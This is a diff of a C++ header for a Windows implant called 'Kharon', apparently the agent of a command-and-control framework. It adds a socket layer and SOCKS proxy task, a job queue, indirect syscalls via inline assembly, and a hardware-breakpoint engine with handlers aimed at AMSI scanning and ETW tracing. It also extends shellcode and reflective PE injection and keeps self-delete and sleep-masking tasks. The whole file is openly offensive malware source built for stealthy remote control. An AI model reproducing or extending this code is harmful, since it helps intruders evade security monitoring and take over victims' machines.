@@ -4,6 +4,7 @@
 #include <windows.h>
 #include <ntstatus.h>
 #include <guiddef.h>
+#include <winsock.h>
 
 namespace mscorlib {
     #include <Mscoree.h>
@@ -29,6 +30,11 @@ EXTERN_C UPTR EndPtr();
 
 /* ========= [ Config ] ========= */
 
+#define KH_JOB_TERMINATE  0x010
+#define KH_JOB_SUSPENDED  0x100
+#define KH_JOB_RUNNING    0x200
+#define KH_JOB_PRE_START  0x300
+
 #define KH_CHUNK_SIZE 512000 // 512 KB
 
 #ifndef KH_AGENT_UUID
@@ -40,7 +46,7 @@ EXTERN_C UPTR EndPtr();
 #endif // KH_SLEEP_TIME
 
 #ifndef KH_JITTER
-#define KH_JITTER 100
+#define KH_JITTER 0
 #endif // KH_JITTER
 
 #ifndef KH_INDIRECT_SYSCALL_ENABLED
@@ -48,11 +54,11 @@ EXTERN_C UPTR EndPtr();
 #endif // KH_INDIRECT_SYSCALL_ENABLED
 
 #ifndef KH_INJECTION_PE 
-#define KH_INJECTION_PE KhReflection
+#define KH_INJECTION_PE PeReflection
 #endif // KH_INJECTION_PE
 
 #ifndef KH_INJECTION_SC
-#define KH_INJECTION_SC KhClassic
+#define KH_INJECTION_SC ScClassic
 #endif // KH_INJECTION_SC
 
 #ifndef KH_HEAP_MASK
@@ -107,6 +113,11 @@ EXTERN_C UPTR EndPtr();
 #define PIPE_NAME ""
 #endif // PIPE_NAME
 
+class Spoof;
+class Syscall;
+class HwbpEng;
+class Jobs;
+class Useful;
 class Dotnet;
 class Memory;
 class Mask;
@@ -120,11 +131,28 @@ class Heap;
 class Library;
 class Transport;
 class Token;
+class Socket;
+
+typedef struct JOBS {
+    PPACKAGE Pkg;
+    PPARSER  Psr;
+    HANDLE   Handle;
+    ULONG    State;
+    ULONG    ExitCode;
+    PCHAR    UUID;
+    ULONG    CmdID;
+    struct JOBS* Next;  
+} JOBS, *PJOBS;
 
 namespace Root {
 
     class Kharon {    
     public:
+        Spoof*     Spf;
+        Syscall*   Sys;
+        Socket*    Sckt;
+        Jobs*      Jbs;
+        Useful*    Usf;
         Dotnet*    Dot;
         Library*   Lib;
         Token*     Tkn;
@@ -150,12 +178,14 @@ namespace Root {
             ULONG UsedRAM;
             ULONG TotalRAM;
             ULONG PercentRAM;
-            ULONG OsArch;
+            BYTE  OsArch;
             ULONG OsMjrV;
             ULONG OsMnrV;
             ULONG ProductType;
             ULONG OsBuild;
-        } Machine = {};
+        } Machine = {
+            .DomName= "N/A"
+        };
 
         struct {
             PCHAR AgentID;
@@ -185,21 +215,31 @@ namespace Root {
         };
 
         struct {
-            ULONG Qtt;
-        } Job = {
-            .Qtt = 1
-        };
-
-        struct {
             UPTR Dr0;
             UPTR Dr1;
             UPTR Dr2;
             UPTR Dr3;
-        } Hwbp;
+        } HwbpEng;
 
         struct {
+            UPTR Handle;
 
-        } SpoofCtx = {};
+            DECLAPI( closesocket );
+            DECLAPI( send );
+            DECLAPI( connect );
+            DECLAPI( inet_addr );
+            DECLAPI( htons );
+            DECLAPI( socket );
+            DECLAPI( recv );
+        } Ws2_32 = {
+            RSL_TYPE( closesocket ),
+            RSL_TYPE( send ),
+            RSL_TYPE( connect ),
+            RSL_TYPE( inet_addr ),
+            RSL_TYPE( htons ),
+            RSL_TYPE( socket ),
+            RSL_TYPE( recv ),
+        };
 
         struct {
             UPTR Handle;
@@ -355,6 +395,8 @@ namespace Root {
             DECLAPI( NtProtectVirtualMemory );
             DECLAPI( NtCreateSection );
             DECLAPI( NtMapViewOfSection );
+
+            DECLAPI( LdrGetProcedureAddress );
     
             DECLAPI( NtOpenProcess );
             DECLAPI( NtCreateThreadEx ); 
@@ -400,6 +442,8 @@ namespace Root {
             RSL_TYPE( NtProtectVirtualMemory ),
             RSL_TYPE( NtCreateSection ),
             RSL_TYPE( NtMapViewOfSection ),
+
+            RSL_TYPE( LdrGetProcedureAddress ),
     
             RSL_TYPE( NtOpenProcess ),
             RSL_TYPE( NtCreateThreadEx ),
@@ -456,12 +500,16 @@ namespace Root {
         struct {
             UPTR Handle;
 
+            DECLAPI( VariantClear );
+            DECLAPI( VariantInit );
             DECLAPI( SafeArrayCreateVector );
             DECLAPI( SafeArrayCreate );
             DECLAPI( SysAllocString );
             DECLAPI( SafeArrayPutElement );
             DECLAPI( SafeArrayDestroy );
         } Oleaut32 = {
+            RSL_TYPE( VariantClear ),
+            RSL_TYPE( VariantInit ),
             RSL_TYPE( SafeArrayCreateVector ),
             RSL_TYPE( SafeArrayCreate ),
             RSL_TYPE( SysAllocString ),
@@ -548,6 +596,11 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
+        VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
+        VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
+        VOID InitSocket( Socket* SocketRf ) { Sckt = SocketRf; }
+        VOID InitJobs( Jobs* JobsRf ) { Jbs = JobsRf; }
+        VOID InitUseful( Useful* UsefulRf ) { Usf = UsefulRf; }
         VOID InitDotnet( Dotnet* DotnetRf ) { Dot = DotnetRf; }
         VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
         VOID InitHeap( Heap* HeapRf ) { Hp = HeapRf; } 
@@ -564,13 +617,142 @@ namespace Root {
     };
 }
 
-class Dotnet {
-private:
-    Root::Kharon* Kh;
-public:
-    Dotnet( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+class Syscall {
 
     struct {
+        ULONG ssn;
+        ULONG Hash;
+        UPTR  Address;
+        UPTR  Instruction;
+    } Ext[Last] = {};
+
+    auto Fetch(
+        _In_ ULONG Hash
+    ) -> BOOL;
+
+    template<typename... Args>
+    auto DECLFN Run(
+        _In_ ESYS_OPT Idx,
+        _In_ Args...  args
+    ) -> NTSTATUS {
+        asm( "mov r14, %0" : : "r"( Ext[Idx].ssn ) );
+        asm( "mov r15, %0" : : "r"( Ext[Idx].Instruction ) );
+    
+        return ExecSyscall( args... );
+    }
+};
+
+class HwbpEng {
+private:
+    Root::Kharon* Self;
+public:
+    HwbpEng( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    PDESCRIPTOR_HOOK Threads = nullptr;
+
+    struct {
+        UPTR NtTraceEvent;
+    } Etw;
+
+    struct {
+        UPTR Handle;
+        UPTR AmsiScanBuffer;
+    } Amsi;
+
+    auto SetDr7(
+        _In_ UPTR ActVal,
+        _In_ UPTR NewVal,
+        _In_ INT  StartPos,
+        _In_ INT  BitsCount
+    ) -> UPTR;
+
+    auto SetBreak(
+        _In_ HANDLE Handle,
+        _In_ UPTR   Address,
+        _In_ PVOID  Detour,
+        _In_ INT8   Drx
+    ) -> BOOL;
+
+    auto RmBreak(
+        _In_ HANDLE Handle,
+        _In_ INT8   Drx
+    ) -> BOOL;
+ 
+    auto GetFuncArg(
+        _In_ PCONTEXT Ctx,
+        _In_ ULONG    Idx
+    ) -> UPTR;
+
+    auto SetFuncArg(
+        _In_ PCONTEXT Ctx,
+        _In_ UPTR     Val,
+        _In_ ULONG    Idx
+    ) -> VOID;
+
+    auto BlockReal(
+        _In_ PCONTEXT Ctx
+    ) -> VOID;
+
+    auto MainHandler( 
+        _In_ PEXCEPTION_POINTERS e 
+    ) -> LONG;
+
+    auto EtwHandler(
+        _In_ PCONTEXT
+    ) -> LONG;
+
+    auto AmsiHandler(
+        _In_ PCONTEXT
+    ) -> LONG;
+};
+
+class Jobs {
+private:
+    Root::Kharon* Self;
+public:
+    Jobs( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    ULONG Count = 0;
+    PJOBS List  = nullptr;
+
+    auto Create(
+        _In_ PCHAR UUID, 
+        _In_ PPARSER Parser
+    ) -> PJOBS;
+    
+    auto Send( 
+        _In_ PPACKAGE PostJobs 
+    ) -> VOID;
+
+    auto ExecuteAll( VOID ) -> VOID;
+    
+    auto Execute(
+        _In_ PJOBS Job
+    ) -> ERROR_CODE;
+    
+    auto GetByUUID(
+        _In_ PCHAR UUID
+    ) -> PJOBS;
+    
+    auto GetByID(
+        _In_ ULONG ID
+    ) -> PJOBS;
+
+    auto Cleanup( VOID ) -> VOID;
+    
+    auto Remove(
+        _In_ PJOBS Job
+    ) -> BOOL;
+};
+
+class Dotnet {
+private:
+    Root::Kharon* Self;
+public:
+    Dotnet( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    struct {
+        GUID xIID_IHostControl;
         GUID xCLSID_CLRMetaHost;
         GUID xCLSID_CorRuntimeHost;
         GUID xIID_AppDomain;
@@ -578,6 +760,7 @@ public:
         GUID xIID_ICLRRuntimeInfo;
         GUID xIID_ICorRuntimeHost;
     } GUID = {
+        .xIID_IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
         .xCLSID_CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
         .xCLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
         .xIID_AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
@@ -587,12 +770,20 @@ public:
     };
 
     struct {
-        PWCHAR w; // pointer
+        PWCHAR w; // wide pointer
         ULONG  s; // size
-        PCHAR  a;
-    } Buffer;
+        PCHAR  a; // ascii pointer
+    } Buffer = {
+        .w = NULL,
+        .s = 0,
+        .a = NULL
+    };
 
-    BOOL KeepLoad;
+    BOOL KeepLoad = FALSE;
+
+    auto PatchExit(
+        _In_ ICorRuntimeHost* IRuntime
+    ) -> HRESULT;
 
     auto Inline(
         _In_ PBYTE AsmBytes,
@@ -604,21 +795,32 @@ public:
     ) -> BOOL;
 };
 
-class Resolve {
+class Useful {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Resolve( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
+    auto FixRel(
+        _In_ PVOID Base,
+        _In_ UPTR  Delta,
+        _In_ PIMAGE_DATA_DIRECTORY DataDir
+    ) -> VOID;
 
+    auto DECLFN FixImp(
+        _In_ PVOID Base,
+        _In_ PIMAGE_DATA_DIRECTORY DataDir
+    ) -> BOOL;
 };
 
 class Package {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 
 public:
-    Package( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Package( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    PPACKAGE Global = nullptr; // for temporary usage
 
     auto Base64Enc(
         _In_ const unsigned char* in, 
@@ -641,41 +843,45 @@ public:
         _In_ const char* in
     ) -> SIZE_T;
 
-    auto AddInt16( 
+    auto Int16( 
         _In_ PPACKAGE Package, 
         _In_ INT16    dataInt 
     ) -> VOID;
 
-    auto AddInt32( 
+    auto Int32( 
         _In_ PPACKAGE Package, 
         _In_ INT32    dataInt
     ) -> VOID;
 
-    auto AddInt64( 
+    auto Int64( 
         _In_ PPACKAGE Package, 
         _In_ INT64    dataInt 
     ) -> VOID;
 
-    auto AddPad( 
+    auto Pad( 
         _In_ PPACKAGE Package, 
         _In_ PUCHAR   Data, 
         _In_ SIZE_T   Size 
     ) -> VOID;
 
-    auto AddBytes( 
+    auto Bytes( 
         _In_ PPACKAGE Package, 
         _In_ PUCHAR   Data, 
         _In_ SIZE_T   Size 
     ) -> VOID;
 
-    auto AddByte( 
+    auto Byte( 
         _In_ PPACKAGE Package, 
         _In_ BYTE     dataInt 
     ) -> VOID;
 
     auto Create( 
-        _In_ ULONG   CommandID,
-        _In_ PPARSER Parser
+        _In_ ULONG CommandID,
+        _In_ PCHAR UUID
+    ) -> PPACKAGE;
+
+    auto PostJobs(
+        VOID
     ) -> PPACKAGE;
 
     auto NewTask( 
@@ -700,22 +906,24 @@ public:
         _In_ ULONG ErrorCode
     ) -> VOID;
 
-    auto AddString( 
+    auto Str( 
         _In_ PPACKAGE package, 
         _In_ PCHAR    data 
     ) -> VOID;
 
-    auto AddWString( 
+    auto Wstr( 
         _In_ PPACKAGE package, 
         _In_ PWCHAR   data 
     ) -> VOID;
 };
 
 class Parser {
-    private:
-    Root::Kharon* Kh;
+private:
+    Root::Kharon* Self;
 public:
-    Parser( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Parser( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    PPARSER Shared;
 
     auto NewTask( 
         _In_ PPARSER parser, 
@@ -734,33 +942,33 @@ public:
         _Out_ ULONG size
     ) -> PBYTE;
 
-    auto GetByte(
+    auto Byte(
         _In_ PPARSER Parser
     ) -> BYTE;
 
-    auto GetInt16(
+    auto Int16(
         _In_ PPARSER Parser
     ) -> INT16;
 
-    auto GetInt32(
+    auto Int32(
         _In_ PPARSER Parser
     ) -> INT32;
 
-    auto GetInt64(
+    auto Int64(
         _In_ PPARSER Parser
     ) -> INT64;
 
-    auto GetBytes(
+    auto Bytes(
         _In_  PPARSER parser,
         _Out_ PULONG  size
     ) -> PBYTE;
 
-    auto GetStr( 
+    auto Str( 
         _In_ PPARSER parser, 
         _In_ PULONG  size 
     ) -> PCHAR;
 
-    auto GetWstr(
+    auto Wstr(
         _In_ PPARSER parser, 
         _In_ PULONG  size 
     ) -> PWCHAR;
@@ -772,9 +980,9 @@ public:
 
 class Transport {    
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Transport( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     struct {
         PWCHAR Host;
@@ -802,7 +1010,7 @@ public:
         struct {
             PCHAR FileID;
             ULONG ChunkSize;
-            ULONG CurrentChunk;
+            ULONG CurChunk;
             ULONG TotalChunks;
             PCHAR Path;
         } Up;
@@ -810,7 +1018,11 @@ public:
         struct {
 
         } Down;
-    } Tf;
+    } Tf = {
+        .Up = {
+            .ChunkSize = KH_CHUNK_SIZE
+        }
+    };
 
     struct {
         PCHAR Name;
@@ -830,88 +1042,127 @@ public:
     ) -> BOOL;
 };
 
+typedef struct _SOCKET_CTX {
+    ULONG  ServerID;
+    SOCKET Socket;
+
+    struct _SOCKET_CTX* Next;
+} SOCKET_CTX, *PSOCKET_CTX;
+
+class Socket {
+private:
+    Root::Kharon* Self;
+public:
+    Socket( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    ULONG       Count = 0;
+    PSOCKET_CTX Ctx   = nullptr;
+
+    auto Exist( 
+        _In_ ULONG ServerID 
+    ) -> BOOL;
+
+    auto Add(
+        _In_ ULONG  ServerID,
+        _In_ SOCKET Socket
+    ) -> ERROR_CODE;
+
+    auto Get(
+        _In_ ULONG  ServerID
+    ) -> SOCKET;
+
+    auto RmCtx(
+        _In_ ULONG ServerID
+    ) -> ERROR_CODE;
+};
+
 class Task {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Task( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Task( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto Dispatcher( 
         VOID 
     ) -> VOID;
 
     auto Injection(
-        _In_ PPARSER Parser
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto Download(
-        _In_ PPARSER Parser
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
     
     auto Upload(
-        _In_ PPARSER Parser
+        _In_ PJOBS Job
+    ) -> ERROR_CODE;
+
+    auto Socks( 
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto Config( 
-        _In_ PPARSER Parser 
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto SelfDelete( 
-        _In_ PPARSER Parser 
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto SleepMask( 
-        _In_ PPARSER Parser 
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto SleepTime( 
-        _In_ PPARSER Parser
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto Process( 
-        _In_ PPARSER Parser
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
-    auto GetInfo( 
-        _In_ PPARSER Parser
+    auto Info( 
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto FileSystem( 
-        _In_ PPARSER Parser 
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto Dotnet(
-        _In_ PPARSER Parser 
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
     auto Exit(
-        _In_ PPARSER Parser
+        _In_ PJOBS Job
     ) -> ERROR_CODE;
 
-    typedef auto ( Task::*TASK_FUNC )( PPARSER ) -> ERROR_CODE;
+    typedef auto ( Task::*TASK_FUNC )( PJOBS ) -> ERROR_CODE;
 
     struct {
         ULONG        ID;
-        ERROR_CODE ( Task::*Run )( PPARSER );
+        ERROR_CODE ( Task::*Run )( PJOBS );
     } Mgmt[TSK_LENGTH] = {
         Mgmt[0].ID = TkExit,       Mgmt[0].Run = &Task::Exit,
         Mgmt[1].ID = TkFileSystem, Mgmt[1].Run = &Task::FileSystem,
         Mgmt[2].ID = TkProcess,    Mgmt[2].Run = &Task::Process,
-        Mgmt[3].ID = TkGetInfo,    Mgmt[3].Run = &Task::GetInfo,
+        Mgmt[3].ID = TkGetInfo,    Mgmt[3].Run = &Task::Info,
         Mgmt[4].ID = TkSelfDelete, Mgmt[4].Run = &Task::SelfDelete,
         Mgmt[5].ID = TkInjection,  Mgmt[5].Run = &Task::Injection,
         Mgmt[6].ID = TkConfig,     Mgmt[6].Run = &Task::Config,
         Mgmt[7].ID = TkDownload,   Mgmt[7].Run = &Task::Download,
         Mgmt[8].ID = TkUpload,     Mgmt[8].Run = &Task::Upload,
         Mgmt[9].ID = TkDotnet,     Mgmt[9].Run = &Task::Dotnet,
+        Mgmt[10].ID = TkSocks,     Mgmt[10].Run = &Task::Socks,
     };
 };
 
 class Process {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Process( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Process( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
     
     struct {
         ULONG ParentID;
@@ -932,7 +1183,6 @@ public:
     ) -> HANDLE;
 
     auto Create(
-        _In_  PPACKAGE             Package,
         _In_  PCHAR                CommandLine,
         _In_  ULONG                PsFlags,
         _Out_ PPROCESS_INFORMATION PsInfo
@@ -941,9 +1191,9 @@ public:
 
 class Thread {
     private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Thread( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Thread( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto RndEnum( 
         VOID
@@ -967,9 +1217,9 @@ public:
 
 class Library {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Library( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Library( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto Load(
         _In_ PCHAR LibName
@@ -978,9 +1228,9 @@ public:
 
 class Token {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Token( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Token( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto GetUser( 
         _Out_ PCHAR *UserNamePtr, 
@@ -997,9 +1247,9 @@ public:
 
 class Heap {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Heap( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Heap( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto DECLFN Alloc(
         _In_ ULONG Size
@@ -1018,9 +1268,9 @@ public:
 
 class Memory {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Memory( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Memory( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto Alloc(
         _In_ HANDLE Handle,
@@ -1055,9 +1305,9 @@ public:
 
 class Mask {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
-    Mask( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Mask( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     struct {
         UPTR  NtContinueGadget;
@@ -1093,27 +1343,38 @@ public:
 
 class Injection {
 private:
-    Root::Kharon* Kh;
+    Root::Kharon* Self;
 public:
+    Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     struct {
         struct {
+            struct {
+                UINT32 ID;
+                PVOID  Ptr;
+            } Keep[10];
+
             UINT8 TechniqueID;
         } PE;
 
         struct {
+            struct {
+                UINT32 ID;
+                PVOID  Ptr;
+            } Keep[10];
+
             UINT8 TechniqueID;
         } Sc; 
 
         struct {
-            BOOL  Boolean;
-            ULONG Length;
-            PCHAR Name;
+            BOOL  b;
+            ULONG s;
+            PCHAR p;
         } Pipe;
 
         struct {
-            ULONG Length;
-            PBYTE Buffer;
+            ULONG s;
+            PBYTE p;
         } Param;
         
         BOOL  Spawn;
@@ -1125,15 +1386,20 @@ public:
         .Syscall = KH_INDIRECT_SYSCALL_ENABLED
     };
 
-    Injection( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    auto Shellcode(
+        _In_ PBYTE Buffer,
+        _In_ UPTR  Size
+    ) -> BOOL;
 
     auto Classic(
         _In_      PBYTE   Buffer,
         _In_      UPTR    Size,
         _In_      PVOID   Param,
-        _Out_opt_ PBYTE*  OutBuff,
         _Out_     PVOID*  Base,
-        _Out_     HANDLE* ThreadHandle
+        _Out_     HANDLE* TdHandle,
+        _Out_     PULONG  TdID,
+        _Out_opt_ PBYTE*  OutBuff,
+        _Out_opt_ ULONG*  OutLen
     ) -> BOOL;
 
     auto Reflection(
